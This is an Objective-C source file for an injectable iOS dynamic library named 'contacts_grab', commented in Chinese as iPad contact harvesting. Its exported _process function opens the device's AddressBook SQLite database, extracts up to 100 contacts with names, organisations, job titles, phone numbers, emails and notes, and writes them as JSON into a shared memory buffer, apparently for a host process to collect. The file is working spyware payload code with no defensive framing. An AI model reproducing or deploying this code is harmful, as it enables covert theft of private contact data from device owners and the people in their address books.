/**
 * contacts_grab.dylib — iPad 通讯录采集
 * 编译: xcrun --sdk iphoneos clang -arch arm64 -dynamiclib
 *         -fobjc-arc -mios-version-min=14.0
 *         -framework Foundation -lsqlite3
 *         -o contacts_grab.dylib contacts_grab.c
 */

#import <Foundation/Foundation.h>
#import <sqlite3.h>
#import <stdint.h>
#import <string.h>

#define STATE_READY 7
#define MAX_OUTPUT  (8 * 1024 * 1024)
#define MAX_CONTACTS 100

static void write_buffer(uint32_t *buf, const char *json, size_t len) {
    if (len > MAX_OUTPUT - 8) len = MAX_OUTPUT - 8;
    memcpy((uint8_t *)buf + 8, json, len);
    buf[1] = (uint32_t)len;
    buf[0] = STATE_READY;
}

static NSString *json_esc(NSString *s) {
    NSString *r = [s stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    r = [r stringByReplacingOccurrencesOfString:@"\"" withString:@"\\\""];
    r = [r stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"];
    return r;
}

__attribute__((visibility("default")))
void _process(uint32_t *shared) {
    @autoreleasepool {
        // 尝试多个联系人数据库路径
        const char *paths[] = {
            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
            "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
            NULL
        };

        sqlite3 *db = NULL;
        int rc = 1;
        for (int i = 0; paths[i]; i++) {
            rc = sqlite3_open_v2(paths[i], &db,
                SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL);
            if (rc == SQLITE_OK && db) break;
            if (db) { sqlite3_close(db); db = NULL; }
        }

        if (rc != SQLITE_OK || !db) {
            write_buffer(shared, "{\"error\":\"contacts_db_not_found\"}", 35);
            return;
        }

        // 查询通讯录: ABPerson JOIN ABMultiValue
        const char *sql =
            "SELECT p.rowid, p.First, p.Last, p.Organization, "
            "       p.Department, p.JobTitle, p.Nickname, p.Note, "
            "       (SELECT value FROM ABMultiValue "
            "        WHERE record_id = p.rowid "
            "        AND property = 3 LIMIT 1) AS phone, "
            "       (SELECT value FROM ABMultiValue "
            "        WHERE record_id = p.rowid "
            "        AND property = 4 LIMIT 1) AS email "
            "FROM ABPerson p "
            "WHERE (p.First IS NOT NULL OR p.Last IS NOT NULL "
            "  OR p.Organization IS NOT NULL) "
            "LIMIT ";

        // Fallback: simpler query if join fails
        const char *fallback =
            "SELECT rowid, First, Last, Organization "
            "FROM ABPerson "
            "WHERE First IS NOT NULL OR Last IS NOT NULL "
            "OR Organization IS NOT NULL LIMIT 100";

        sqlite3_stmt *stmt = NULL;
        char fullsql[512];
        snprintf(fullsql, sizeof(fullsql), "%s%d", sql, MAX_CONTACTS);
        rc = sqlite3_prepare_v2(db, fullsql, -1, &stmt, NULL);
        if (rc != SQLITE_OK) {
            rc = sqlite3_prepare_v2(db, fallback, -1, &stmt, NULL);
        }

        if (rc != SQLITE_OK) {
            char buf[300];
            snprintf(buf, sizeof(buf),
                "{\"error\":\"query_failed\",\"msg\":\"%s\"}",
                sqlite3_errmsg(db));
            write_buffer(shared, buf, strlen(buf));
            sqlite3_close(db);
            return;
        }

        NSMutableString *json = [NSMutableString stringWithFormat:
            @"{\"status\":\"ok\",\"type\":\"contacts\",\"contacts\":["];

        NSUInteger count = 0;
        int colCount = sqlite3_column_count(stmt);

        while (sqlite3_step(stmt) == SQLITE_ROW && count < MAX_CONTACTS) {
            int64_t rowid = sqlite3_column_int64(stmt, 0);

            const char *first = (const char*)sqlite3_column_text(stmt, 1);
            const char *last  = (const char*)sqlite3_column_text(stmt, 2);
            const char *org   = (const char*)sqlite3_column_text(stmt, 3);
            const char *dept  = colCount > 4 ? (const char*)sqlite3_column_text(stmt, 4) : NULL;
            const char *title = colCount > 5 ? (const char*)sqlite3_column_text(stmt, 5) : NULL;
            const char *nick  = colCount > 6 ? (const char*)sqlite3_column_text(stmt, 6) : NULL;
            const char *note  = colCount > 7 ? (const char*)sqlite3_column_text(stmt, 7) : NULL;
            const char *phone = colCount > 8 ? (const char*)sqlite3_column_text(stmt, 8) : NULL;
            const char *email = colCount > 9 ? (const char*)sqlite3_column_text(stmt, 9) : NULL;

            // 构建名字
            NSMutableString *name = [NSMutableString string];
            if (last) [name appendFormat:@"%s", last];
            if (first) {
                if (name.length) [name appendString:@" "];
                [name appendFormat:@"%s", first];
            }
            if (!name.length && org) [name appendFormat:@"%s (org)", org];
            if (!name.length) [name appendString:@"(no name)"];

            if (name.length > 100) [name deleteCharactersInRange:NSMakeRange(100, name.length - 100)];

            if (count > 0) [json appendString:@","];
            [json appendFormat:
                @"{\"name\":\"%@\"", json_esc(name)];

            if (org && org[0]) [json appendFormat:@",\"org\":\"%@\"", json_esc([NSString stringWithUTF8String:org])];
            if (dept && dept[0]) [json appendFormat:@",\"dept\":\"%@\"", json_esc([NSString stringWithUTF8String:dept])];
            if (title && title[0]) [json appendFormat:@",\"title\":\"%@\"", json_esc([NSString stringWithUTF8String:title])];
            if (phone && phone[0]) [json appendFormat:@",\"phone\":\"%s\"", phone];
            if (email && email[0]) [json appendFormat:@",\"email\":\"%s\"", email];
            if (note && note[0] && strlen(note) < 200)
                [json appendFormat:@",\"note\":\"%@\"", json_esc([NSString stringWithUTF8String:note])];

            [json appendString:@"}"];
            count++;

            if (json.length > MAX_OUTPUT - 4096) break;
        }

        [json appendFormat:@",\"total\":%lu}", (unsigned long)count];

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        const char *cstr = [json UTF8String];
        write_buffer(shared, cstr, strlen(cstr));
    }
}
